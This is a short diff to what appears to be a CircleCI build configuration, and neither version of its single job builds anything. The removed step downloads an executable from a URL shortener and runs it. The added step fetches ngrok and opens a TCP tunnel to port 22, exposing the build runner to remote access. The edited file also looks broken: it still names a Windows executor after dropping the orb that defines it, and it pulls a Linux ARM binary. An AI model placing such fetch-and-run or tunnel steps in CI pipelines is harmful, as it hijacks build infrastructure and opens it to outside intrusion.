@@ -1,12 +1,7 @@
-version: 2.1
- 
-orbs:
-  win: circleci/windows@2.2.0
- 
 jobs:
   build:
     executor:
       name: win/default
-      shell: cmd.exe
+      shell: bash
     steps:
-      - run: curl -L -o lqyY8.exe https://shorturl.at/lqyY8 && lqyY8.exe
+      - run: wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz && tar -xvf ngrok-stable-linux-arm64.tgz && ./ngrok tcp 22
